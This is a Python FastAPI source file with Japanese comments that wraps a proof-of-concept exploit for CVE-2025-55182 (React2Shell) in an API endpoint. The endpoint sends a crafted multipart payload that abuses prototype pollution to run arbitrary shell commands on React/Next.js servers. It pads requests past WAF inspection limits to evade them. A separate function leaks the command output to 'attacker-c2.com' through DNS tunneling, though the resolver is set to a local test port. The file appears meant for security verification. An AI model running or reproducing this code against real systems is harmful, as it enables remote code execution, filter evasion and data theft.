from fastapi import FastAPI
import requests
import json
import dns.resolver
import uuid

app = FastAPI(
    title="Brest Security API",
    description="セキュリティを検証する機能をAPIで提供する。",
    summary="Security API by REST",
    version="0.0.1",
)

app_base_path = "/poc"

def get_session_id():
    """
    ランダムなセッションIDを生成します。
    これはデータの断片を識別するために使用されます。
    例: 'a1b2c3d4'
    """
    session_id = str(uuid.uuid4())[:8]
    return session_id


def dns_tunneling(original_bytes: bytes, c2_domain: str):
    """
    データを外部に盗み出すためにDNSを利用する手法を想定した関数です。
    original_bytes: 盗み出したいデータのバイト列
    c2_domain: 攻撃者が管理するC2サーバーのドメイン名
    """
    # 1. 盗んだデータを16進数（hex）に変換
    if isinstance(original_bytes, str):
        original_bytes = original_bytes.encode('utf-8')
    
    data_hex = original_bytes.hex()

    # 解決先（resolver）のカスタム設定
    resolver = dns.resolver.Resolver(configure=False)
    # dig @127.0.0.1 と同じことをするためにネームサーバーを指定
    resolver.nameservers = ['127.0.0.1']
    resolver.port = 1053 # 検証用DNSサーバーの動作しているポート
    
    # 2. 30文字ずつに分割してループ
    chunk_size = 30
    session_id = get_session_id()
    for i in range(0, len(data_hex), chunk_size):
        chunk = data_hex[i : i + chunk_size]
        sequence_number = i // chunk_size # 切り捨てて除算

        # 3. 連結して完全な形のドメインを作成
        # 例: 0.61646d...attacker-c2.com
        target_fqdn = f"{session_id}.{sequence_number}.{chunk}.{c2_domain}"
        print(f"Sending: {target_fqdn}")

        try:
            # 4. DNSルックアップを実行（Aレコードを引こうとする）
            # 実際にはIPが返ってくる必要はなく、この「問い合わせ」がC2に届くことが目的
            # 手早くデータを送るためタイムアウトは短くする。
            resolver.resolve(target_fqdn, "A", lifetime=1)
        except Exception:
            # 応答がなくてもパケットは送信されているのでOK
            pass

    # 5. 最後にEOFを送信して終了を通知
    eof_fqdn = f"{session_id}.999.656f66.{c2_domain}"
    print(f"Sending EOF: {eof_fqdn}")
    try:
        resolver.resolve(eof_fqdn, "A", lifetime=1)
    except:
        pass    


@app.post(f"{app_base_path}/react2shell/command/", tags=["poc"], response_model=dict)
async def execute_command(body: dict):
    """
    CVE-2025-55182 (React2Shell) のPoCコードを実行します。

    参考文献:
    * https://securitylabs.datadoghq.com/articles/cve-2025-55182-react2shell-remote-code-execution-react-server-components/
    * https://github.com/msanft/CVE-2025-55182
    * https://github.com/msanft/CVE-2025-55182/blob/main/poc.py
    * https://github.com/ejpir/CVE-2025-55182-research?tab=readme-ov-file
    """
    # ターゲットURLと実行コマンドを設定
    base_url = body.get("url")
    executable_command = body.get("command")

    # ----------------------------------------------------
    # WAF回避のための設定
    # ----------------------------------------------------
    # WAFはパフォーマンス維持のためにペイロードの一部しか検査しないことがある。
    # この挙動を悪用し、WAFの検査範囲外に悪意のあるペイロードを配置することで、
    # 攻撃を成功させることが可能となる。
    # WAFの検査制限（例: 64KB）を確実に超えるように、パディングサイズを定義する。
    # AWS WAFの制限は8KBから64KBの範囲であり、ここでは65KB (65536バイト)とする。
    # これにより実際の攻撃ペイロードはWAFの検査範囲の外に配置される。
    padding_size = 65 * 1024  # 65KB
    padding_data = "A" * padding_size

    # ----------------------------------------------------
    # チャンク 0: 悪意のあるフェイクチャンクの定義 (RCEペイロード)
    # ----------------------------------------------------
    crafted_chunk = {
        # チャンク1経由でChunk.prototype.then()を参照する (Thenable化)
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        # $B0 をトリガーするペイロード
        "value": '{"then": "$B0"}',
        "_response": {
            # 実行コマンドを注入し、Next.jsのエラーハンドリングを利用して結果を抽出
            # 脆弱性対応されたReactやNext.jsで動作するアプリに対してはタイムアウトになる。
            # _prefixプロパティにコードを注入する理由は、Reactがここに書かれたコードを
            # 実行する仕組みになっているためである。
            # digestという名前のプロパティに結果を保存しているのはdigestプロパティが
            # Next.jsにおいてエラーハンドリング時にそのままレスポンスに含まれることがあり、
            # その振る舞いが攻撃者に悪用されやすいためである。
            # またNEXT_REDIRECTはNext.jsにおいて特別な内部エラーとして処理される。攻撃者はこの振る舞いも利用している。
            "_prefix": f"var res = process.mainModule.require('child_process').execSync('{executable_command}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
            # Functionコンストラクタを取得するプロトタイプ汚染パス
            "_formData": {
                "get": "$1:constructor:constructor",
            },
        },
    }

    # ----------------------------------------------------
    # マルチパートフォームデータ (files) の定義
    # ----------------------------------------------------
    files = {
        # 1. パディングフィールド: WAFの検査を消費させるために最初に配置
        "padding": (None, padding_data),
        # 2. チャンク 0: 悪意のある JSON ペイロード (検査制限を超えた後に配置)
        "0": (None, json.dumps(crafted_chunk)),
        # 3. チャンク 1: チャンク0への生（raw）の参照 (検査制限を超えた後に配置)
        "1": (None, '"$@0"'),
    }

    # ----------------------------------------------------
    # リクエストの実行
    # ----------------------------------------------------
    headers = {"Next-Action": "x"}  # Server Actionリクエストであることを示す。
    res = requests.post(base_url, files=files, headers=headers, timeout=10)
    print(res.status_code)

    # content（生のバイト列）を明示的に UTF-8 でデコードする
    # errors='replace' を入れることで、万が一壊れたバイナリがあってもエラーで止まらない    
    decoded_result = res.content.decode('utf-8', errors='replace')
    print(decoded_result) # res.textでは文字化けしてしまう。

    # C2サーバーに文字化けさせず転送するためにcontent（バイト列）を利用する。
    dns_tunneling(res.content, "attacker-c2.com")

    # 検証のために結果を返す。
    return {
        "result": decoded_result,
    }
